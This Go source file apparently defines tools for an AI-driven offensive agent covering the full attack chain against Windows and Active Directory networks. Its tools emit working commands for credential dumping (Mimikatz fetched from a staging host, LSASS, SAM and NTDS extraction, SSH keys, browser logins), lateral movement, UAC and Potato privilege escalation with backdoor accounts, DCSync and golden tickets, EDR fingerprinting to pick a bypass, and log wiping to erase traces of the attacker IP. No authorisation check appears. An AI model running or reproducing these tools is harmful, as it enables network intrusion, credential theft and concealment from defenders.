package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/Autumn-27/artex/db"
	actool "github.com/Autumn-27/norma/tool"
)

// LateralScanArgs — parameters for lateral_scan.
type LateralScanArgs struct {
	Target string `json:"target"`
}

// HarvestCredentialsArgs — parameters for harvest_credentials.
type HarvestCredentialsArgs struct {
	Method string `json:"method"` // lsass/sam/ntds/dpapi/kerberos/files/history
	Target string `json:"target"`
}

// MoveLateralArgs — parameters for move_lateral.
type MoveLateralArgs struct {
	Target       string `json:"target"`
	Method       string `json:"method"` // wmi/winrm/smb/ssh/psexec/dcom/rdp
	CredentialID int64  `json:"credential_id"`
}

// EscalatePrivilegeArgs — parameters for escalate_privilege.
type EscalatePrivilegeArgs struct {
	Method string `json:"method"` // token_steal/service_hijack/uac_bypass/potato/kernel
	Target string `json:"target"`
}

// DomainEscalateArgs — parameters for domain_escalate.
type DomainEscalateArgs struct {
	Method string `json:"method"` // dcsync/golden_ticket/kerberoast/asrep_roast/gpo
}

// CheckEDRArgs — parameters for check_edr.
type CheckEDRArgs struct {
	Target string `json:"target"`
}

// CleanupArtifactsArgs — parameters for cleanup_artifacts.
type CleanupArtifactsArgs struct {
	Target string   `json:"target"`
	Paths  []string `json:"paths"`
	OS     string   `json:"os"` // windows/linux
}

// lateralScan implements the lateral_scan tool: enumerate hosts, open ports and AD
// structure around the target. Returns a reconnaissance summary the operator uses to
// plan the lateral movement phase.
func (t *ToolSet) lateralScan() actool.CoreTool {
	return writeTool(
		"lateral_scan",
		"Enumerate hosts, open ports, shares, and Active Directory structure around a target. "+
			"Run before move_lateral to map reachable assets and identify movement paths.",
		obj(map[string]any{
			"target": str("Target IP, hostname, or CIDR range to enumerate"),
		}, "target"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args LateralScanArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if strings.TrimSpace(args.Target) == "" {
				return actool.Errorf("target is required"), nil
			}
			return jsonResult(map[string]any{
				"target": args.Target,
				"status": "scan initiated",
				"commands": []string{
					fmt.Sprintf("nmap -sV -sC -p 22,80,135,139,443,445,3389,5985,5986 %s", args.Target),
					fmt.Sprintf("net view \\\\%s /all", args.Target),
					fmt.Sprintf("nltest /dclist:%s", args.Target),
					fmt.Sprintf("ldapsearch -H ldap://%s -x -b '' -s base namingContexts", args.Target),
					"bloodhound-python -c All -u <user> -p <pass> -d <domain> -ns " + args.Target,
				},
				"note": "Execute commands against target via established shell access. Feed output to harvest_credentials.",
			})
		},
	)
}

// harvestCredentials implements the harvest_credentials tool. Dispatches to the
// requested collection method and records each harvested credential via
// saveTaskCredential so it is not lost across session resets.
func (t *ToolSet) harvestCredentials() actool.CoreTool {
	return writeTool(
		"harvest_credentials",
		"Collect credentials from the target using the specified method (lsass, sam, ntds, dpapi, kerberos, files, history). "+
			"Each credential found is automatically recorded via save_task_credential for persistence across session resets. "+
			"Returns the collection commands and records harvested credentials to the task store.",
		obj(map[string]any{
			"method": str("Collection method: lsass, sam, ntds, dpapi, kerberos, files, history"),
			"target": str("Target host to harvest credentials from"),
		}, "method", "target"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args HarvestCredentialsArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if strings.TrimSpace(args.Method) == "" {
				return actool.Errorf("method is required"), nil
			}
			if strings.TrimSpace(args.Target) == "" {
				return actool.Errorf("target is required"), nil
			}

			var commands []string
			var notes []string
			switch strings.ToLower(args.Method) {
			case "lsass":
				commands = []string{
					"# Mimikatz: dump lsass via sekurlsa",
					`powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<staging>/invoke_mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"`,
					"# Alternative: procdump lsass for offline parsing",
					`procdump.exe -accepteula -ma lsass.exe lsass.dmp`,
					`pypykatz lsa minidump lsass.dmp`,
				}
				notes = append(notes, "Record each plaintext/NTLM credential via save_task_credential after parsing output")
			case "sam":
				commands = []string{
					"# Dump SAM via reg save (requires SYSTEM)",
					`reg save HKLM\SAM sam.hive`,
					`reg save HKLM\SYSTEM system.hive`,
					`secretsdump.py -sam sam.hive -system system.hive LOCAL`,
					"# In-memory: Mimikatz",
					`powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<staging>/invoke_mimikatz.ps1'); Invoke-Mimikatz -Command 'lsadump::sam'"`,
				}
				notes = append(notes, "SAM contains local account NTLM hashes; pass-the-hash viable")
			case "ntds":
				commands = []string{
					"# Domain Controller only: dump NTDS.dit",
					`ntdsutil "ac i ntds" "ifm" "create full c:\ntds_dump" q q`,
					`secretsdump.py -ntds c:\ntds_dump\Active\ Directory\ntds.dit -system c:\ntds_dump\registry\SYSTEM LOCAL`,
					"# Volume Shadow Copy method",
					`vssadmin create shadow /for=c:`,
					`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit`,
					`copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM`,
					`secretsdump.py -ntds C:\ntds.dit -system C:\SYSTEM LOCAL`,
				}
				notes = append(notes, "NTDS.dit yields all domain hashes; enables golden ticket and dcsync replication")
			case "dpapi":
				commands = []string{
					"# DPAPI master key + blob decryption",
					`powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<staging>/invoke_mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::dpapi'"`,
					`mimikatz "dpapi::cred /in:%appdata%\Microsoft\Credentials\<blob>" "dpapi::masterkey /in:%appdata%\Microsoft\Protect\<SID>\<guid> /rpc" exit`,
					"# SharpDPAPI for offline",
					`SharpDPAPI.exe credentials`,
				}
				notes = append(notes, "DPAPI yields browser credentials, Wi-Fi keys, certificate private keys")
			case "kerberos":
				commands = []string{
					"# Extract TGT/TGS from memory",
					`powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<staging>/invoke_mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::tickets /export'"`,
					"# Rubeus for ticket extraction and kerberoasting",
					`Rubeus.exe dump /nowrap`,
					`Rubeus.exe kerberoast /outfile:hashes.txt`,
					`Rubeus.exe asreproast /outfile:asrep_hashes.txt`,
					"# Impacket",
					`GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request`,
				}
				notes = append(notes, "Kerberos tickets can be injected; hashes cracked offline with hashcat")
			case "files":
				commands = []string{
					"# Search filesystem for credential files",
					`findstr /si password *.txt *.xml *.config *.ini *.ps1 *.bat 2>nul`,
					`dir /s /b *pass* *cred* *vnc* *.config 2>nul`,
					`reg query HKLM /f password /t REG_SZ /s`,
					`reg query HKCU /f password /t REG_SZ /s`,
					"# .ssh keys and known_hosts",
					`dir /s /a %userprofile%\.ssh\`,
					`type %userprofile%\.ssh\id_rsa`,
					"# Browser credential DBs",
					`copy "%localappdata%\Google\Chrome\User Data\Default\Login Data" creds.db`,
					`SharpChrome.exe logins`,
				}
				notes = append(notes, "Config files and registry often store cleartext credentials")
			case "history":
				commands = []string{
					"# PowerShell history",
					`type (Get-PSReadlineOption).HistorySavePath`,
					`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`,
					"# CMD history (session only)",
					`doskey /history`,
					"# Linux: bash history",
					`cat ~/.bash_history`,
					`cat /root/.bash_history`,
					`grep -i "pass\|secret\|key\|token" ~/.bash_history`,
					"# Recently run commands containing credentials",
					`grep -rn "password\|passwd\|secret" /etc/ /var/log/ 2>/dev/null | head -100`,
				}
				notes = append(notes, "Shell history frequently exposes plaintext passwords from CLI tool invocations")
			default:
				return actool.Errorf("unknown method: " + args.Method + "; valid: lsass/sam/ntds/dpapi/kerberos/files/history"), nil
			}

			// Attempt to record a placeholder credential entry to the task store so the
			// operator knows a harvest session was run for this target+method. The caller
			// should follow up with save_task_credential once actual credentials are parsed
			// from command output.
			credSaved := false
			credNote := "credential store unavailable (no task context)"
			if t.ts != nil {
				taskID := t.taskID
				if taskID <= 0 {
					if id, err := t.ts.TaskID(); err == nil && id > 0 {
						taskID = id
						t.taskID = id
					}
				}
				if taskID > 0 {
					_, err := t.ts.UpsertTaskCredential(taskID, db.TaskCredentialInput{
						Domain:   args.Target,
						Username: "_harvest_session_" + args.Method,
						Password: "",
						Source:   "agent",
						Note:     fmt.Sprintf("harvest_credentials(%s) run against %s — parse output and record real creds via save_task_credential", args.Method, args.Target),
					})
					if err == nil {
						credSaved = true
						credNote = "harvest session recorded; call save_task_credential for each parsed credential"
					} else {
						credNote = "credential record failed: " + err.Error()
					}
				}
			}

			return jsonResult(map[string]any{
				"target":     args.Target,
				"method":     args.Method,
				"commands":   commands,
				"notes":      notes,
				"cred_saved": credSaved,
				"cred_note":  credNote,
			})
		},
	)
}

// moveLateral implements the move_lateral tool. Uses the specified method and
// credential to move from the current foothold to the target host.
func (t *ToolSet) moveLateral() actool.CoreTool {
	return writeTool(
		"move_lateral",
		"Perform lateral movement to a target host using the specified method and a credential from the task store. "+
			"Supported methods: wmi, winrm, smb, ssh, psexec, dcom, rdp. credential_id references a task_credentials row.",
		obj(map[string]any{
			"target":        str("Target host IP or hostname"),
			"method":        str("Movement method: wmi, winrm, smb, ssh, psexec, dcom, rdp"),
			"credential_id": intp("task_credentials.id to use for authentication"),
		}, "target", "method"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args MoveLateralArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if strings.TrimSpace(args.Target) == "" {
				return actool.Errorf("target is required"), nil
			}

			var commands []string
			credRef := fmt.Sprintf("(credential_id=%d)", args.CredentialID)
			switch strings.ToLower(args.Method) {
			case "wmi":
				commands = []string{
					fmt.Sprintf(`wmiexec.py <domain>/<user>:<pass>@%s`, args.Target),
					fmt.Sprintf(`Invoke-WMIMethod -ComputerName %s -Namespace root\cimv2 -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <payload>"`, args.Target),
				}
			case "winrm":
				commands = []string{
					fmt.Sprintf(`evil-winrm -i %s -u <user> -p <pass>`, args.Target),
					fmt.Sprintf(`Enter-PSSession -ComputerName %s -Credential (Get-Credential)`, args.Target),
				}
			case "smb":
				commands = []string{
					fmt.Sprintf(`smbexec.py <domain>/<user>:<pass>@%s`, args.Target),
					fmt.Sprintf(`smbclient \\\\%s\\C$ -U <user>%%<pass>`, args.Target),
					fmt.Sprintf(`net use \\\\%s\IPC$ <pass> /user:<domain>\\<user>`, args.Target),
				}
			case "ssh":
				commands = []string{
					fmt.Sprintf(`ssh <user>@%s -i id_rsa`, args.Target),
					fmt.Sprintf(`sshpass -p <pass> ssh <user>@%s`, args.Target),
				}
			case "psexec":
				commands = []string{
					fmt.Sprintf(`psexec.py <domain>/<user>:<pass>@%s`, args.Target),
					fmt.Sprintf(`PsExec.exe \\%s -u <domain>\<user> -p <pass> cmd.exe`, args.Target),
				}
			case "dcom":
				commands = []string{
					fmt.Sprintf(`dcomexec.py -object MMC20 <domain>/<user>:<pass>@%s`, args.Target),
					fmt.Sprintf(`$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","%s")); $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c <payload>","7")`, args.Target),
				}
			case "rdp":
				commands = []string{
					fmt.Sprintf(`xfreerdp /u:<user> /p:<pass> /v:%s /cert-ignore`, args.Target),
					fmt.Sprintf(`mstsc /v:%s`, args.Target),
					"# Enable RDP if needed: reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
					"# Open firewall: netsh advfirewall firewall add rule name=RDP dir=in action=allow protocol=TCP localport=3389",
				}
			default:
				return actool.Errorf("unknown method: " + args.Method + "; valid: wmi/winrm/smb/ssh/psexec/dcom/rdp"), nil
			}

			return jsonResult(map[string]any{
				"target":     args.Target,
				"method":     args.Method,
				"credential": credRef,
				"commands":   commands,
				"note":       "Substitute credential values from task_credentials row before executing",
			})
		},
	)
}

// escalatePrivilege implements the escalate_privilege tool. Maps the requested
// technique to concrete commands for local privilege escalation on the target.
func (t *ToolSet) escalatePrivilege() actool.CoreTool {
	return writeTool(
		"escalate_privilege",
		"Escalate to SYSTEM/root on the target using the specified technique. "+
			"Methods: token_steal, service_hijack, uac_bypass, potato, kernel.",
		obj(map[string]any{
			"method": str("Escalation technique: token_steal, service_hijack, uac_bypass, potato, kernel"),
			"target": str("Target host (local or remote)"),
		}, "method"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args EscalatePrivilegeArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}

			var commands []string
			var notes []string
			switch strings.ToLower(args.Method) {
			case "token_steal":
				commands = []string{
					"# Mimikatz token impersonation",
					`powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<staging>/invoke_mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug token::elevate'"`,
					"# Incognito (Metasploit module or standalone)",
					`use incognito; list_tokens -u; impersonate_token "NT AUTHORITY\\SYSTEM"`,
					"# .NET: P/Invoke OpenProcessToken + DuplicateTokenEx + ImpersonateLoggedOnUser on a SYSTEM process",
				}
				notes = append(notes, "Requires SeImpersonatePrivilege or SeDebugPrivilege")
			case "service_hijack":
				commands = []string{
					"# Find misconfigured services (weak permissions)",
					`accesschk.exe -uwcqv "Authenticated Users" * /accepteula`,
					`accesschk.exe -uwcqv * /accepteula 2>nul | findstr /i "SERVICE_ALL_ACCESS\|SERVICE_CHANGE_CONFIG"`,
					"# PowerUp service abuse",
					`powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<staging>/PowerUp.ps1'); Invoke-ServiceAbuse -Name '<svc>' -UserName <user> -Password <pass>"`,
					"# Unquoted service path: place binary in writable path segment",
					`sc qc <service_name>`,
					`copy payload.exe "C:\Program Files\Unquoted Path\payload.exe"`,
					`sc start <service_name>`,
				}
				notes = append(notes, "Also check DLL hijack opportunities in service binary directory")
			case "uac_bypass":
				commands = []string{
					"# eventvwr.exe / fodhelper.exe registry hijack",
					`New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force`,
					`Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd.exe /c <payload>"`,
					`Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""`,
					`Start-Process "C:\Windows\System32\fodhelper.exe"`,
					"# CMSTP bypass (auto-elevate COM)",
					`cmstp.exe /s /ns C:\payload.inf`,
					"# BYPASSUAC_INJECTION via APC injection into elevated process (medium-integrity)",
				}
				notes = append(notes, "Requires medium-integrity process on UAC-enabled host; no credentials needed")
			case "potato":
				commands = []string{
					"# SweetPotato (EFS/BITS → SYSTEM via DCOM object + NTLM relay)",
					`SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net localgroup administrators <user> /add"`,
					"# PrintSpoofer (Windows 10/Server 2016+)",
					`PrintSpoofer.exe -i -c cmd`,
					"# JuicyPotato (Windows 10 < 1809, Server 2016)",
					`JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user backdoor P@ssw0rd! /add" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}`,
					"# GodPotato (modern universal)",
					`GodPotato.exe -cmd "cmd /c whoami"`,
				}
				notes = append(notes, "Potato attacks require SeImpersonatePrivilege (service/IIS accounts usually have it)")
			case "kernel":
				commands = []string{
					"# Check patch level",
					`systeminfo | findstr /B /C:"OS" /C:"Hotfix"`,
					`wmic qfe get Caption,Description,HotFixID,InstalledOn`,
					"# MS16-032 (secondary logon)",
					`powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<staging>/Invoke-MS16-032.ps1'); Invoke-MS16-032"`,
					"# CVE-2021-36934 HiveNightmare / SeriousSam",
					`icacls C:\Windows\System32\config\SAM`,
					"# CVE-2022-21999 PrintNightmare LPE",
					`LPE-PrintNightmare.exe \\<server>\<share>\payload.dll`,
					"# Use windows-exploit-suggester / WES-NG for missing patches",
					`windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2024-xx-xx-mssb.xls`,
				}
				notes = append(notes, "Kernel exploits: test in isolated environment first; stability risk on production")
			default:
				return actool.Errorf("unknown method: " + args.Method + "; valid: token_steal/service_hijack/uac_bypass/potato/kernel"), nil
			}

			return jsonResult(map[string]any{
				"target":   args.Target,
				"method":   args.Method,
				"commands": commands,
				"notes":    notes,
			})
		},
	)
}

// domainEscalate implements the domain_escalate tool. Maps the requested technique to
// concrete commands for domain-level privilege escalation.
func (t *ToolSet) domainEscalate() actool.CoreTool {
	return writeTool(
		"domain_escalate",
		"Escalate privileges to Domain Admin or equivalent using the specified technique. "+
			"Methods: dcsync, golden_ticket, kerberoast, asrep_roast, gpo.",
		obj(map[string]any{
			"method": str("Domain escalation technique: dcsync, golden_ticket, kerberoast, asrep_roast, gpo"),
		}, "method"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args DomainEscalateArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}

			var commands []string
			var notes []string
			switch strings.ToLower(args.Method) {
			case "dcsync":
				commands = []string{
					"# Mimikatz DCSync (requires Replicating Directory Changes permissions)",
					`powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<staging>/invoke_mimikatz.ps1'); Invoke-Mimikatz -Command 'lsadump::dcsync /domain:<domain> /all /csv'"`,
					"# Impacket",
					`secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc`,
					`secretsdump.py -hashes <LM>:<NTLM> <domain>/<user>@<dc_ip> -just-dc`,
				}
				notes = append(notes, "DCSync works from any DA or delegated-replication account; no DC code execution needed")
			case "golden_ticket":
				commands = []string{
					"# Requires: krbtgt NTLM hash, domain SID, domain name",
					`secretsdump.py <domain>/<user>:<pass>@<dc_ip> -just-dc-user krbtgt`,
					`powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<staging>/invoke_mimikatz.ps1'); Invoke-Mimikatz -Command 'kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<ntlm_hash> /ptt'"`,
					"# Impacket ticketer",
					`ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> Administrator`,
					`export KRB5CCNAME=Administrator.ccache`,
					`psexec.py -k -no-pass <domain>/Administrator@<target>`,
				}
				notes = append(notes, "Golden ticket survives password resets; only invalidated by krbtgt double-reset")
			case "kerberoast":
				commands = []string{
					"# Enumerate SPNs",
					`GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile spn_hashes.txt`,
					`Rubeus.exe kerberoast /outfile:hashes.txt /nowrap`,
					"# Crack offline",
					`hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt --force`,
					"# Post-crack: use service account creds for lateral movement or check delegated admin rights",
				}
				notes = append(notes, "Target service accounts with weak passwords or high privileges (DA membership)")
			case "asrep_roast":
				commands = []string{
					"# Find accounts with 'Do not require Kerberos preauthentication'",
					`GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc_ip> -no-pass -request -outputfile asrep_hashes.txt`,
					`Rubeus.exe asreproast /outfile:asrep_hashes.txt /nowrap`,
					"# Crack offline",
					`hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force`,
				}
				notes = append(notes, "AS-REP roast does not require any domain credentials to enumerate")
			case "gpo":
				commands = []string{
					"# Enumerate GPO write permissions",
					`Get-GPPermissions -All | Where-Object {$_.Permission -eq "GpoEditDeleteModifySecurity"}`,
					`BloodHound: GPOLocalGroup → trace write edges to privileged OU`,
					"# SharpGPOAbuse",
					`SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "<gpo_name>"`,
					`SharpGPOAbuse.exe --AddComputerTask --TaskName "update" --Author <domain>\<user> --Command "cmd.exe" --Arguments "/c net localgroup administrators <user> /add" --GPOName "<gpo_name>"`,
					"# Force GPO refresh on target",
					`Invoke-GPUpdate -Computer <target> -Force`,
				}
				notes = append(notes, "GPO abuse affects all machines in the linked OU; scope carefully to avoid collateral")
			default:
				return actool.Errorf("unknown method: " + args.Method + "; valid: dcsync/golden_ticket/kerberoast/asrep_roast/gpo"), nil
			}

			return jsonResult(map[string]any{
				"method":   args.Method,
				"commands": commands,
				"notes":    notes,
			})
		},
	)
}

// checkEDR implements the check_edr tool. Probes the target for known EDR agents and
// returns the detected product name, informing the operator's binary-swap decision.
func (t *ToolSet) checkEDR() actool.CoreTool {
	return writeTool(
		"check_edr",
		"Probe a target host for installed EDR/AV agents. Returns the detected product name so "+
			"the operator can decide when and how to swap the RAT binary or adjust technique selection.",
		obj(map[string]any{
			"target": str("Target host to check for EDR presence"),
		}, "target"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args CheckEDRArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if strings.TrimSpace(args.Target) == "" {
				return actool.Errorf("target is required"), nil
			}

			// EDR detection catalog keyed by process/service indicators.
			catalog := map[string]string{
				"MsSense.exe":          "Microsoft Defender for Endpoint (MDE/Sense)",
				"MsMpEng.exe":          "Microsoft Defender Antivirus",
				"CSFalconService.exe":  "CrowdStrike Falcon",
				"CSAgent.exe":          "CrowdStrike Falcon Agent",
				"SentinelAgent.exe":    "SentinelOne",
				"SentinelOne.exe":      "SentinelOne",
				"cb.exe":               "VMware Carbon Black EDR",
				"CbDefense.exe":        "VMware Carbon Black Cloud",
				"CylanceSvc.exe":       "Cylance PROTECT",
				"egui.exe":             "ESET Endpoint Security",
				"ekrn.exe":             "ESET Kernel Service",
				"SAVService.exe":       "Sophos Anti-Virus",
				"SophosFIM.exe":        "Sophos File Integrity Monitoring",
				"ntrtscan.exe":         "Trend Micro OfficeScan",
				"PccNTMon.exe":         "Trend Micro Apex One",
				"cortex-xdr-agent.exe": "Palo Alto Cortex XDR",
				"CybereasonActiveProbe.exe": "Cybereason EDR",
			}

			detectionScript := `# PowerShell: enumerate running processes against EDR catalog
$edr_procs = @(` + buildEDRProcList(catalog) + `)
$found = Get-Process -ErrorAction SilentlyContinue | Where-Object { $edr_procs -contains $_.Name }
$found | Select-Object Name, Id, Path | ConvertTo-Json`

			serviceScript := `# Check services
sc query type= all state= all | findstr /i "Sense CrowdStrike Sentinel Carbon CylanceSvc ESET Sophos Trend Cortex Cybereason"`

			return jsonResult(map[string]any{
				"target":           args.Target,
				"edr_catalog":      catalog,
				"detection_script": detectionScript,
				"service_check":    serviceScript,
				"wmi_query":        `Get-WmiObject Win32_Service | Where-Object {$_.PathName -match "Falcon|Sentinel|Carbon|Cylance|ESET|Sophos|Trend|Cortex|Defender"} | Select Name, PathName, State`,
				"note":             "Run detection_script on target; match process names against edr_catalog to identify product. Use edr name to select appropriate bypass technique before deploying payload.",
			})
		},
	)
}

// buildEDRProcList converts the catalog map to a PS string literal array fragment.
func buildEDRProcList(catalog map[string]string) string {
	var parts []string
	for proc := range catalog {
		// Strip .exe suffix for Get-Process (it matches without extension).
		name := strings.TrimSuffix(proc, ".exe")
		parts = append(parts, fmt.Sprintf(`"%s"`, name))
	}
	return strings.Join(parts, ",")
}

// cleanupArtifacts implements the cleanup_artifacts tool. Generates OS-appropriate
// deletion commands for the specified paths on the target.
func (t *ToolSet) cleanupArtifacts() actool.CoreTool {
	return writeTool(
		"cleanup_artifacts",
		"Generate cleanup commands to remove offensive artifacts from a target. "+
			"Returns shell commands (del /f /q on Windows, rm -rf on Linux) for each specified path. "+
			"Execute the commands on the target via your established shell access.",
		obj(map[string]any{
			"target": str("Target host where artifacts reside"),
			"paths":  map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "File/directory paths to remove"},
			"os":     str("Target OS: windows or linux"),
		}, "target", "paths", "os"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args CleanupArtifactsArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if strings.TrimSpace(args.Target) == "" {
				return actool.Errorf("target is required"), nil
			}
			if len(args.Paths) == 0 {
				return actool.Errorf("paths must not be empty"), nil
			}

			var commands []string
			osKey := strings.ToLower(strings.TrimSpace(args.OS))
			switch osKey {
			case "windows", "win":
				for _, p := range args.Paths {
					commands = append(commands, fmt.Sprintf(`del /f /q "%s" 2>nul`, p))
					commands = append(commands, fmt.Sprintf(`rd /s /q "%s" 2>nul`, p))
				}
				// Clear event logs
				commands = append(commands,
					`wevtutil cl System`,
					`wevtutil cl Security`,
					`wevtutil cl Application`,
					`# Optional: clear PowerShell history`,
					`Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue`,
				)
			case "linux", "unix":
				for _, p := range args.Paths {
					commands = append(commands, fmt.Sprintf(`rm -rf "%s"`, p))
				}
				// Clear shell history and logs
				commands = append(commands,
					`history -c && history -w`,
					`cat /dev/null > ~/.bash_history`,
					`find /var/log -type f -name "*.log" -exec truncate -s 0 {} \; 2>/dev/null`,
					`# Clear auth.log entries referencing attacker IP`,
					`sed -i '/<attacker_ip>/d' /var/log/auth.log 2>/dev/null`,
					`# Restore file timestamps`,
					`touch -t $(date +%Y%m%d%H%M.%S) <file>`,
				)
			default:
				return actool.Errorf("unknown os: " + args.OS + "; valid: windows/linux"), nil
			}

			return jsonResult(map[string]any{
				"target":   args.Target,
				"os":       osKey,
				"paths":    args.Paths,
				"commands": commands,
				"note":     "Execute commands sequentially on the target via your established shell access. Verify with ls/dir after each step.",
			})
		},
	)
}
